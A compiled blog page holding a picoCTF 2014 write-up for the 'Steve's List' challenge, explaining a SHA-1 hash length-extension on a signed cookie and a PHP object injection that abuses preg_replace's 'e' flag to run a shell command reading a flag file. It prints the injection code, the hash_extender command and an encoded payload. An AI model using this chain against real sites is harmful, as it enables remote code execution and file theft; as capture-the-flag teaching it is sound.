"use strict";(self.webpackChunkpersonalpage=self.webpackChunkpersonalpage||[]).push([[505],{6493:(e,t,s)=>{s.r(t),s.d(t,{assets:()=>h,contentTitle:()=>c,default:()=>d,frontMatter:()=>a,metadata:()=>n,toc:()=>l});var n=s(9149),i=s(4848),o=s(8453);const a={slug:"picoctf-2014-part3",title:"picoCTF 2014 part 3: Steve's List",authors:"csressel"},c="Steve\u2019s List",h={authorsImageUrls:[void 0]},l=[{value:"Summary",id:"summary",level:2},{value:"The Hash Extension",id:"the-hash-extension",level:2},{value:"The Object Injection",id:"the-object-injection",level:2}];function r(e){const t={code:"code",h2:"h2",hr:"hr",li:"li",ol:"ol",p:"p",pre:"pre",...(0,o.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(t.h2,{id:"summary",children:"Summary"}),"\n",(0,i.jsxs)(t.p,{children:["Hash extension allows us to enter whatever cookies we choose, without knowledge of the secret, and still pass the website\u2019s checks. Since the cookie is unserialized, we can inject arbitrary php objects into the server. By injecting a Post object, we know it\u2019s destroy method will be called. This method has been redefined to output the Post\u2019s fields in HTML comments after parsing them with the class Filter. The Filter operates by running the given text through preg_replace calls with stored params for match and substitution. As we have injected the object, we have complete control over these stored params, and can thus call the preg_replace with the \u2018e\u2019 flag, allowing us to do arbitrary command execution. By catting the necessary file at ",(0,i.jsx)(t.code,{children:"/home/daedalus/flag.txt"}),", and substituting all of the Post\u2019s text with the file\u2019s contents, we can print the file\u2019s contents in an HTML comment, and thus get the flag."]}),"\n",(0,i.jsx)(t.h2,{id:"the-hash-extension",children:"The Hash Extension"}),"\n",(0,i.jsx)(t.p,{children:"Examination of the hacked website shows the only possible input is through the cookies.\nHowever, any attempts to manipulate the cooke result in us being locked out of the website."}),"\n",(0,i.jsx)(t.p,{children:"Examination of the website source makes it quickly apparent why:"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-PHP",children:"$custom_settings = urldecode($_COOKIE['custom_settings']);\n$hash = sha1(AUTH_SECRET . $custom_settings);\nif ($hash !== $_COOKIE['custom_settings_hash']) {\n  die(\"Why would you hack Section Chief Steve's site? :(\");\n}\n"})}),"\n",(0,i.jsxs)(t.p,{children:["The cookie ",(0,i.jsx)(t.code,{children:"custom_settings"})," will later be deserialized, and will be the site of our object inject. However, ",(0,i.jsx)(t.code,{children:"custom_settings_hash"})," will need to change in a similar manner."]}),"\n",(0,i.jsxs)(t.p,{children:["To not fail the validation, ",(0,i.jsx)(t.code,{children:"custom_settings_hash"})," needs to be of the form ",(0,i.jsx)(t.code,{children:"sha1(AUTH_SECRET . urldecode($_COOKIE['custom_settings']))"})," where ",(0,i.jsx)(t.code,{children:"AUTH_SECRET"})," is an unknown, eight letter secret.\nAs we do not have access to ",(0,i.jsx)(t.code,{children:"AUTH_SECRET"}),", it would appear that we are unable to change the ",(0,i.jsx)(t.code,{children:"custom_settings"})," cookie."]}),"\n",(0,i.jsxs)(t.p,{children:["However, using a hash extension attack, we can change the value of ",(0,i.jsx)(t.code,{children:"custom_settings_hash"})," to correspond to our new value of ",(0,i.jsx)(t.code,{children:"custom_settings"})," without knowledge of the ",(0,i.jsx)(t.code,{children:"AUTH_SECRET"}),"."]}),"\n",(0,i.jsxs)(t.p,{children:["The tool to be used is called ",(0,i.jsx)("a",{href:"https://github.com/iagox86/hash_extender",children:"hash extender"}),". By downloading and compiling the program, we can generate the new value of ",(0,i.jsx)(t.code,{children:"custom_settings_hash"})," with the following command:"]}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-Shell",children:"$ ./hash_extender --data d --secret 8 --append a --signature s --format sha1 --table\n"})}),"\n",(0,i.jsxs)(t.p,{children:["where ",(0,i.jsx)(t.code,{children:"d"})," is the previous ",(0,i.jsx)(t.code,{children:"custom_settings"}),", ",(0,i.jsx)(t.code,{children:"a"})," is the addition to the ",(0,i.jsx)(t.code,{children:"custom_settings"})," (or the object injection), and s is the previous value of ",(0,i.jsx)(t.code,{children:"custom_settings_hash"}),"."]}),"\n",(0,i.jsxs)(t.p,{children:["With this value, we can now manipulate ",(0,i.jsx)(t.code,{children:"custom_settings"})," without tripping Steve\u2019s rudimentary IPS."]}),"\n",(0,i.jsx)(t.h2,{id:"the-object-injection",children:"The Object Injection"}),"\n",(0,i.jsx)(t.p,{children:"There are several important items to notice while reading the source of the website."}),"\n",(0,i.jsxs)(t.ol,{children:["\n",(0,i.jsxs)(t.li,{children:["Whatever is in the ",(0,i.jsx)(t.code,{children:"custom_settings"})," cookie will be unserialized. Specifically, the contents will be split on newlines, and each section will be individually unserialized."]}),"\n",(0,i.jsxs)(t.li,{children:["In the ",(0,i.jsx)(t.code,{children:"classes.php"})," file, the Post\u2019s ",(0,i.jsx)(t.code,{children:"__destruct()"})," method is redefined. It now is intended to output the Post\u2019s fields in comments, as \u201cdebugging stuff.\u201d"]}),"\n",(0,i.jsxs)(t.li,{children:["The Filter class used by the Post\u2019s ",(0,i.jsx)(t.code,{children:"__destruct()"})," method uses the ",(0,i.jsx)(t.code,{children:"preg_replace()"})," method with class fields as arguments."]}),"\n"]}),"\n",(0,i.jsxs)(t.p,{children:["These three facts, taken together, allow us to do arbitrary command execution with viewing of output by injecting objects into the ",(0,i.jsx)(t.code,{children:"custom_settings"})," cookie."]}),"\n",(0,i.jsxs)(t.p,{children:["The necessary object to cat the flag from ",(0,i.jsx)(t.code,{children:"/home/daedalus/flag.txt"})," will look something like this in PHP:"]}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-PHP",children:'$filter_set = [\n\t\tnew Filter(\'/.*/e\', \'system("cat /home/daedalus/flag.txt")\')\n\t];\n$obj = serialize(true) . "\\n" . serialize(new Post(\n\t"the flag is",\n\t"fail",\n\t$filter_set));\n'})}),"\n",(0,i.jsxs)(t.p,{children:["The Filter uses the \u201ce\u201d flag on the ",(0,i.jsx)(t.code,{children:"preg_replace()"})," call. This will run the replacement argument as PHP code and replace the matching text with the output."]}),"\n",(0,i.jsxs)(t.p,{children:["By having out only filter match everything, and run the command ",(0,i.jsx)(t.code,{children:"$ cat /home/daedalus/flag.txt"}),", we will replace the body of the Post we inject with the flag."]}),"\n",(0,i.jsxs)(t.p,{children:["Outputting this serialized object to a file, and inputting that file to the hash_extender command discussed above, we can generate the new value of ",(0,i.jsx)(t.code,{children:"custom_settings_hash"}),". It is important to note, using a file is the best way to go about this part of the problem; before the object is urlencoded, it will have nonprinting characters which you will not be able to copy and paste."]}),"\n",(0,i.jsxs)(t.p,{children:["Finally, by replacing ",(0,i.jsx)(t.code,{children:"custom_settings"})," with a urlencoding of the serialized object, and ",(0,i.jsx)(t.code,{children:"custom_settings_hash"})," with the new signature, we will see the flag in the comments of the site:"]}),"\n",(0,i.jsx)(t.p,{children:"D43d4lu5_w45_h3r3_w1th_s3rialization_chief_steve"}),"\n",(0,i.jsx)(t.hr,{}),"\n",(0,i.jsxs)(t.p,{children:["Note: the payload for ",(0,i.jsx)(t.code,{children:"custom_settings"})," will look something like:"]}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{children:"b%253A1%253B%250AO%253A4%253A%2522Post%2522%253A3%253A%257Bs%253A8%253A%2522%2500%252A%2500title%2522%253Bs%253A11%253A%2522the%2Bflag%2Bis%2522%253Bs%253A7%253A%2522%2500%252A%2500text%2522%253Bs%253A4%253A%2522fail%2522%253Bs%253A10%253A%2522%2500%252A%2500filters%2522%253Ba%253A1%253A%257Bi%253A0%253BO%253A6%253A%2522Filter%2522%253A2%253A%257Bs%253A10%253A%2522%2500%252A%2500pattern%2522%253Bs%253A5%253A%2522%252F.%252A%252Fe%2522%253Bs%253A7%253A%2522%2500%252A%2500repl%2522%253Bs%253A37%253A%2522system%2528%2522cat%2B%252Fhome%252Fdaedalus%252Fflag.txt%2522%2529%2522%253B%257D%257D%257D\n"})}),"\n",(0,i.jsx)(t.p,{children:"However, I do not believe this is perfectly accurate as I recall making changes out of file that were never duplicated in my backup of the payload. Because of this, I have not included the payload or its signature in this writeup."})]})}function d(e={}){const{wrapper:t}={...(0,o.R)(),...e.components};return t?(0,i.jsx)(t,{...e,children:(0,i.jsx)(r,{...e})}):r(e)}},8453:(e,t,s)=>{s.d(t,{R:()=>a,x:()=>c});var n=s(6540);const i={},o=n.createContext(i);function a(e){const t=n.useContext(o);return n.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function c(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:a(e.components),n.createElement(o.Provider,{value:t},e.children)}},9149:e=>{e.exports=JSON.parse('{"permalink":"/blog/picoctf-2014-part3","source":"@site/blog/2014-12-01-picoctf-part3.md","title":"picoCTF 2014 part 3: Steve\'s List","description":"Summary","date":"2014-12-01T00:00:00.000Z","tags":[],"readingTime":4.25,"hasTruncateMarker":true,"authors":[{"name":"Clifford","url":"https://github.com/CSRessel","imageURL":"/img/csressel-xs.jpg","key":"csressel","page":null}],"frontMatter":{"slug":"picoctf-2014-part3","title":"picoCTF 2014 part 3: Steve\'s List","authors":"csressel"},"unlisted":false,"prevItem":{"title":"10 minute moments","permalink":"/blog/many-minutes-few-moments"},"nextItem":{"title":"picoCTF 2014 part 2: secure_page_service","permalink":"/blog/picoctf-2014-part2"}}')}}]);